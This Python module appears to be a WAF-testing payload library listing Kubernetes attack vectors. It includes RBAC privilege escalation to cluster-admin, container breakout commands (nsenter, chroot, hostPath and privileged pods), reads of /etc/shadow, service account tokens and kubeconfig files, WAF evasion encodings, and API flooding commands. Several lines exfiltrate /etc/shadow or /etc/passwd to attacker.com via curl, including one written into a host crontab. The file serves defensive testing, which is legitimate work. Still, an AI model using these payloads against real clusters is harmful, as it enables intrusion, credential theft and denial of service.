#!/usr/bin/env python3
"""
Kubernetes Attack Vectors

This module contains attack vectors that are specific to Kubernetes API and
infrastructure, focusing on common vulnerabilities in Kubernetes deployments.
"""

class KubernetesVectors:
    """Kubernetes attack vectors for testing WAF rules."""
    
    # Basic Kubernetes API access paths and common endpoints
    BASIC = [
        # Core API endpoints
        "/api",
        "/api/v1",
        "/apis",
        "/apis/apps/v1",
        "/apis/batch/v1",
        "/apis/extensions/v1beta1",
        "/healthz",
        "/version",
        "/swagger-ui/",
        "/swaggerapi/",
        "/openapi/v2",
        
        # Common resource endpoints
        "/api/v1/namespaces",
        "/api/v1/pods",
        "/api/v1/services",
        "/api/v1/nodes",
        "/api/v1/secrets",
        "/api/v1/configmaps",
        "/api/v1/persistentvolumes",
        "/api/v1/persistentvolumeclaims",
        
        # Controller resources
        "/apis/apps/v1/deployments",
        "/apis/apps/v1/daemonsets",
        "/apis/apps/v1/statefulsets",
        "/apis/apps/v1/replicasets",
        "/apis/batch/v1/jobs",
        "/apis/batch/v1beta1/cronjobs",
        
        # Admission controllers and webhooks
        "/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurations",
        "/apis/admissionregistration.k8s.io/v1/mutatingwebhookconfigurations",
        
        # Auth related
        "/apis/authentication.k8s.io/v1/tokenreviews",
        "/apis/authorization.k8s.io/v1/subjectaccessreviews",
        "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews",
        
        # Common kubectl proxy paths
        "/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/",
        "/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/"
    ]
    
    # Authentication and authorization bypass attempts
    AUTH_BYPASS = [
        # Token-based auth bypass attempts
        "Authorization: Bearer REDACTED",
        "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.tGFpKgLpXXPzCytjEGJSuBgkYaj4vCVJHGe-yqDfPnE",
        "Authorization: Bearer system:anonymous",
        "Authorization: Bearer system:unauthenticated",
        "Authorization: Bearer system:kube-proxy",
        "Authorization: Bearer system:node:node-name",
        "Authorization: Bearer kubernetes-dashboard",
        
        # Default service account token access
        "/var/run/secrets/kubernetes.io/serviceaccount/token",
        
        # Certificate-based auth bypass attempts
        "kubectl --client-certificate=/path/to/fake.crt --client-key=/path/to/fake.key",
        "curl --cert ./fake.crt --key ./fake.key https://kubernetes.default.svc",
        
        # Anonymous access attempts
        "kubectl --insecure-skip-tls-verify=true get pods",
        "curl -k https://kubernetes-api-endpoint/api/v1/pods",
        
        # API server proxy abuse
        "/api/v1/namespaces/default/services/https:kubernetes-dashboard:/proxy/",
        "/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/",
        
        # Privilege escalation through RBAC
        "kubectl create clusterrolebinding cluster-admin-binding --clusterrole=cluster-admin --user=attacker",
        "kubectl create serviceaccount privileged-sa",
        "kubectl create clusterrolebinding privileged-binding --clusterrole=cluster-admin --serviceaccount=default:privileged-sa"
    ]
    
    # Pod execution and container breakout
    POD_EXEC = [
        # Pod exec commands
        "kubectl exec -it pod-name -- /bin/bash",
        "kubectl exec -it pod-name -- /bin/sh",
        "kubectl exec pod-name -- cat /etc/shadow",
        "kubectl exec pod-name -- cat /var/run/secrets/kubernetes.io/serviceaccount/token",
        "kubectl exec pod-name -- env | grep KUBERNETES",
        
        # Container escape vectors
        "kubectl exec pod-name -- mount /dev/sda1 /mnt",
        "kubectl exec pod-name -- chroot /host /bin/bash",
        "kubectl exec pod-name -- mount -t proc none /proc",
        "kubectl exec pod-name -- nsenter --target 1 --mount --uts --ipc --net --pid -- bash",
        
        # Accessing sensitive files
        "kubectl exec pod-name -- cat /proc/1/environ",
        "kubectl exec pod-name -- cat /proc/self/mountinfo",
        "kubectl exec pod-name -- cat /etc/kubernetes/admin.conf",
        "kubectl exec pod-name -- cat /etc/kubernetes/kubelet.conf",
        
        # Escaping through privileged containers
        "kubectl run privileged --image=alpine --restart=Never --overrides='{\"spec\":{\"containers\":[{\"name\":\"privileged\",\"image\":\"alpine\",\"command\":[\"/bin/sh\",\"-c\",\"sleep 10000\"],\"securityContext\":{\"privileged\":true}}]}}'",
        "kubectl exec privileged -- sh -c 'echo \"* * * * * root curl -s http://attacker.com/$(cat /etc/shadow)\" >> /host/etc/crontab'"
    ]
    
    # Information disclosure attacks
    INFO_DISCLOSURE = [
        # Sensitive information endpoints
        "/api/v1/namespaces/default/secrets",
        "/api/v1/namespaces/kube-system/secrets",
        "/api/v1/namespaces/default/pods?fieldSelector=spec.serviceAccountName=default",
        "/api/v1/namespaces/kube-system/configmaps",
        
        # Node information disclosure
        "/api/v1/nodes",
        "/api/v1/nodes/node-name/proxy/configz",
        "/api/v1/nodes/node-name/proxy/logs",
        "/api/v1/nodes/node-name/proxy/metrics",
        
        # Resource enumeration
        "kubectl get pods --all-namespaces",
        "kubectl get services --all-namespaces",
        "kubectl get deployments --all-namespaces",
        "kubectl get secrets --all-namespaces",
        
        # Debug endpoints
        "/debug/pprof/",
        "/metrics",
        "/healthz",
        "/healthz/etcd",
        "/healthz/log",
        
        # Log access
        "kubectl logs pod-name",
        "kubectl logs -f pod-name",
        "kubectl logs --previous pod-name",
        "kubectl logs deployment/deployment-name"
    ]
    
    # Malicious pod creation and privilege escalation
    MALICIOUS_WORKLOADS = [
        # Privileged pod creation
        """{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": {
    "name": "privileged-pod"
  },
  "spec": {
    "containers": [
      {
        "name": "privileged",
        "image": "alpine",
        "command": ["/bin/sh", "-c", "sleep 10000"],
        "securityContext": {
          "privileged": true
        }
      }
    ]
  }
}""",
        
        # Host path volume mount attack
        """{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": {
    "name": "hostpath-pod"
  },
  "spec": {
    "containers": [
      {
        "name": "hostpath-container",
        "image": "alpine",
        "command": ["/bin/sh", "-c", "sleep 10000"],
        "volumeMounts": [
          {
            "name": "hostpath-volume",
            "mountPath": "/host"
          }
        ]
      }
    ],
    "volumes": [
      {
        "name": "hostpath-volume",
        "hostPath": {
          "path": "/"
        }
      }
    ]
  }
}""",
        
        # Pod with host network
        """{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": {
    "name": "hostnetwork-pod"
  },
  "spec": {
    "hostNetwork": true,
    "containers": [
      {
        "name": "hostnetwork-container",
        "image": "alpine",
        "command": ["/bin/sh", "-c", "sleep 10000"]
      }
    ]
  }
}""",
        
        # Pod with host PID namespace
        """{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": {
    "name": "hostpid-pod"
  },
  "spec": {
    "hostPID": true,
    "containers": [
      {
        "name": "hostpid-container",
        "image": "alpine",
        "command": ["/bin/sh", "-c", "sleep 10000"]
      }
    ]
  }
}""",
        
        # Container with CAP_SYS_ADMIN
        """{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": {
    "name": "sysadmin-pod"
  },
  "spec": {
    "containers": [
      {
        "name": "sysadmin-container",
        "image": "alpine",
        "command": ["/bin/sh", "-c", "sleep 10000"],
        "securityContext": {
          "capabilities": {
            "add": ["SYS_ADMIN"]
          }
        }
      }
    ]
  }
}"""
    ]
    
    # Command injection through Kubernetes API
    COMMAND_INJECTION = [
        # Command injection in container args
        """{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": {
    "name": "cmd-injection-pod"
  },
  "spec": {
    "containers": [
      {
        "name": "injection",
        "image": "alpine",
        "command": ["/bin/sh"],
        "args": ["-c", "curl -s http://attacker.com/$(cat /etc/passwd)"]
      }
    ]
  }
}""",
        
        # Command injection in environment variables
        """{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": {
    "name": "env-injection-pod"
  },
  "spec": {
    "containers": [
      {
        "name": "env-injection",
        "image": "alpine",
        "command": ["/bin/sh", "-c", "eval $COMMAND"],
        "env": [
          {
            "name": "COMMAND",
            "value": "curl -s http://attacker.com/$(cat /etc/shadow)"
          }
        ]
      }
    ]
  }
}""",
        
        # Command injection in ConfigMap
        """{
  "apiVersion": "v1",
  "kind": "ConfigMap",
  "metadata": {
    "name": "malicious-script"
  },
  "data": {
    "script.sh": "#!/bin/sh\\n# Malicious script\\ncat /etc/shadow\\ncat /var/run/secrets/kubernetes.io/serviceaccount/token\\n"
  }
}""",
        
        # DNS rebinding attack
        "http://internal-service.namespace.svc.cluster.local",
        "http://kubernetes.default.svc.cluster.local:443/api/v1/namespaces/default/secrets",
        
        # Service mesh abuse
        "curl http://backend-service.default.svc.cluster.local:8080/admin",
        "curl -X POST http://internal-api.default.svc.cluster.local/user/create -d '{\"username\":\"admin\",\"role\":\"admin\"}'"
    ]
    
    # WAF bypass techniques for Kubernetes API
    WAF_BYPASS = [
        # Method tampering
        "X-HTTP-Method-Override: GET",
        "X-HTTP-Method: PUT",
        "X-Method-Override: DELETE",
        
        # Content-Type manipulation
        "Content-Type: text/plain",  # Instead of application/json
        "Content-Type: application/yaml",  # Instead of application/json 
        
        # Path traversal attempts
        "/api/v1/namespaces/default/pods/../secrets",
        "/api/v1/namespaces/default/../../kube-system/secrets",
        "/api/../api/v1/namespaces/kube-system/secrets",
        
        # URL encoding
        "/api/v1/namespaces/kube-system/secrets%2F",
        "/api/v1/namespaces/kube%2Dsystem/secrets",
        "/%61%70%69/%76%31/namespaces/kube-system/secrets",
        
        # Case variation
        "/API/v1/namespaces/kube-system/secrets",
        "/api/V1/namespaces/kube-system/secrets",
        
        # Double encoding
        "/api/v1/namespaces/kube-system/secrets%252F",
        "/%25%36%31%25%37%30%25%36%39/v1/namespaces",
        
        # JSON padding to evade signature checks
        """{"kind": "Secret", "apiVersion": "v1", "metadata": {"name": "mysecret"}, "PADDING": "XXXXXXXXXXXXXXXXXXX", "data": {"username": "YWRtaW4=", "password": "cGFzc3dvcmQ="}}""",
        
        # Unicode normalization
        "/api/v1/namespaces/ku\u0062e-system/secrets",
        "/\u0061pi/v1/namespaces/kube-system/secrets",
        
        # Null byte injection
        "/api/v1/namespaces/kube-system/secrets%00",
        "/api/v1%00/namespaces/kube-system/secrets",
        
        # HTTP parameter pollution
        "?kind=secret&kind=configmap",
        "?namespace=default&namespace=kube-system"
    ]
    
    # Denial of Service (DoS) attacks
    DOS = [
        # CPU exhaustion through complex API requests
        "/api/v1/pods?fieldSelector=status.phase%3DRunning&labelSelector=app%3Dwebapp,environment%3Dproduction,version%3Dv1,team%3Dbackend,priority%3Dhigh",
        "/api/v1/pods?watch=1",  # Long-running connection
        
        # Large resource creation
        """{
            "apiVersion": "v1",
            "kind": "ConfigMap",
            "metadata": {
                "name": "large-config"
            },
            "data": {
                "large-file": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..."  # Repeated for many MB
            }
        }""",
        
        # Recursive watch requests
        "kubectl get pods --watch --all-namespaces",
        "kubectl get events --watch --all-namespaces",
        
        # Resource consumption through many small requests
        "for i in {1..1000}; do kubectl get pods -n default; done",
        "for i in {1..1000}; do kubectl get pods -n kube-system; done",
        
        # API server flooding
        "ab -n 10000 -c 100 https://kubernetes-api/api/v1/namespaces",
        "siege -c 100 -t 60S https://kubernetes-api/api/v1/pods"
    ]
    
    @classmethod
    def all(cls) -> list:
        """Return all Kubernetes vectors."""
        return (
            cls.BASIC +
            cls.AUTH_BYPASS +
            cls.POD_EXEC +
            cls.INFO_DISCLOSURE +
            cls.MALICIOUS_WORKLOADS +
            cls.COMMAND_INJECTION +
            cls.WAF_BYPASS +
            cls.DOS
        )
    
    @classmethod
    def basic(cls) -> list:
        """Return basic Kubernetes API vectors."""
        return cls.BASIC
    
    @classmethod
    def auth_bypass(cls) -> list:
        """Return authentication bypass Kubernetes vectors."""
        return cls.AUTH_BYPASS
    
    @classmethod
    def pod_exec(cls) -> list:
        """Return pod execution Kubernetes vectors."""
        return cls.POD_EXEC
    
    @classmethod
    def info_disclosure(cls) -> list:
        """Return information disclosure Kubernetes vectors."""
        return cls.INFO_DISCLOSURE
    
    @classmethod
    def malicious_workloads(cls) -> list:
        """Return malicious workload Kubernetes vectors."""
        return cls.MALICIOUS_WORKLOADS
    
    @classmethod
    def command_injection(cls) -> list:
        """Return command injection Kubernetes vectors."""
        return cls.COMMAND_INJECTION
    
    @classmethod
    def waf_bypass(cls) -> list:
        """Return WAF bypass Kubernetes vectors."""
        return cls.WAF_BYPASS
    
    @classmethod
    def dos(cls) -> list:
        """Return Denial of Service Kubernetes vectors."""
        return cls.DOS 